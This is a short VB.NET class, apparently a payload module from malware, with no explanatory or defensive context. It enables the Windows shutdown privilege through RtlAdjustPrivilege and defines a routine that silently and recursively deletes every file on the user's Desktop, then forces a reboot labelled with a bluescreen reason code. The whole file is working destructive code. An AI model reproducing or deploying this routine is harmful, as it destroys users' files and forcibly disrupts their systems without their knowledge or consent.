Imports System.IO
Imports System.Runtime.InteropServices

Public Class V3



    Friend Const EWX_LOGOFF As Integer = &H0
    Friend Const EWX_SHUTDOWN As Integer = &H1
    Friend Const EWX_REBOOT As Integer = &H2
    Friend Const EWX_FORCE As Integer = &H4
    Friend Const EWX_POWEROFF As Integer = &H8
    Friend Const EWX_FORCEIFHUNG As Integer = &H10


    Friend Const SHTDN_REASON_MINOR_BLUESCREEN = &HF
    Friend Const SHTDN_REASON_MAJOR_SOFTWARE = &H30000


    <DllImport("user32.dll", ExactSpelling:=True, SetLastError:=True)>
    Friend Shared Function ExitWindowsEx(ByVal flg As Integer, ByVal rea As Integer) As Boolean
    End Function


    <DllImport("ntdll.dll")>
    Public Shared Function RtlAdjustPrivilege(ByVal Privilege As Integer, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, <Out> ByRef PreviousValue As Boolean) As UInteger

    End Function
    Public Declare Auto Function DeleteFileW Lib "kernel32.dll" (ByVal F As String) As Boolean


    Public Shared Sub PowerOptions(ByVal flg As Integer, Optional ByVal minRea As Integer = 0)
        Dim t1 As Boolean


        RtlAdjustPrivilege(19, True, False, t1)
        ExitWindowsEx(flg, 0 Or minRea)
    End Sub


    Public Shared Sub DFOD(ByVal B As Boolean)

        For Each F As String In Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories)
            Try

                DeleteFileW(F)
            Catch ex As Exception
            End Try
        Next

        If B = True Then
            PowerOptions(EWX_REBOOT, 0 Or SHTDN_REASON_MINOR_BLUESCREEN)
        End If
    End Sub
End Class
